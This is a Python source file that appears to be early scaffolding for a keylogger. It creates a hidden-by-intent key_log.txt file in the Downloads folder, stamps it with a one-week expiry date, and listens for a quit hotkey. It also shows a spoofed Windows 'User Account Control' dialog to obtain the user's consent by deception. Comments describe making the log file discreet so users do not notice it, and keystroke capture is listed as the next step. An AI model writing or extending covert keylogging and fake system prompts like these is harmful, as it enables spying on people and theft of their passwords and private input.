"""This file will be for the background stuff."""

import os
import tkinter as tk
from tkinter import messagebox
import keyboard
from datetime import datetime, timedelta
import sys


def file_maker() -> str:
    """This function will create a file for the key logging output."""

    # Check if the file already exist
    home = os.path.expanduser("~")  # Gets C:\Users\YourUsername
    downloads = os.path.join(home, "Downloads")
    file_path = os.path.join(downloads, "key_log.txt")
    print()
    if os.path.exists(file_path):
        # This will check to see if the file is in the downloads folder
        return os.path.abspath(file_path)
    else:
        # This will make the key_log.txt file in the downloads folder
        with open(file_path, "w") as f:
            return os.path.abspath(file_path)

    # # Should not return anything, that way it won't let the user know it exists.
    # if os.path.exists("key_log.txt"):
    #     # will change name later to make it more discreet.
    #     return os.path.abspath("key_log.txt")

    # # Create a new file and write some initial content
    # with open("key_log.txt", "w") as f:
    #     return os.path.abspath("key_log.txt")


def timechecker() -> tuple:
    """This function will check the time and date of the file. IF a week has passed, it will stop the program."""

    # Get the current time and date of the
    # current_time = os.path.getmtime("key_log.txt")
    now = datetime.now()

    # Calculate one week from the current date
    one_week_later = now + timedelta(weeks=1)

    # Format the dates for display
    current_date = now.strftime("%Y-%m-%d %H:%M:%S")
    future_date = one_week_later.strftime("%Y-%m-%d %H:%M:%S")

    return (current_date, future_date)


def time_writter(file_path, current_date, future_date):
    """This function will right the times to the file, if they are already there it will pass"""

    # Check if the file already exists
    if os.path.exists(file_path):
        # This will check to see if the dates are already in the file
        with open(file_path, "r") as f:
            lines = f.readlines()
            if len(lines) >= 2:  # Ensure there are at least two lines to check
                pass

            else:
                # Open the file in write mode and write the times if the dates are not in the file
                with open(file_path, "w") as f:
                    f.write(f"Current Date: {current_date}\n")
                    f.write(f"Future Date: {future_date}\n")
                    # Will write dashes so its easy to find the times
                    f.write("-" * 50 + "\n")
    else:
        pass


def kernel_permission() -> bool:
    """This file will ask for kernel permission."""
    response = messagebox.askyesno(
        "User Account Control",
        "Do you want to allow this app to make changes to your device?",
    )

    if response:
        return True
    else:
        return False


def check_quit():
    """While the program runs in the background, this function will check for the hotkey."""
    if keyboard.is_pressed("ctrl+shift+q"):
        print("Hotkey pressed. Quitting.")
        return True
    return False
    # """Code to run after"""
    # while True:
    # if check_quit():
    #     break


# next steps are to make sure the file is written to and start teh key logger.


def file_make_and_write():
    """ ""This function will make the file and write the times to it."""

    # file path wtih log file
    file_path = file_maker()

    # gets the current and future date
    timestamps = timechecker()

    # This will write the times to the file
    time_writter(file_path, *timestamps)

    # returns the path with the file for logging
    return (file_path, timestamps)


file_make_and_write()
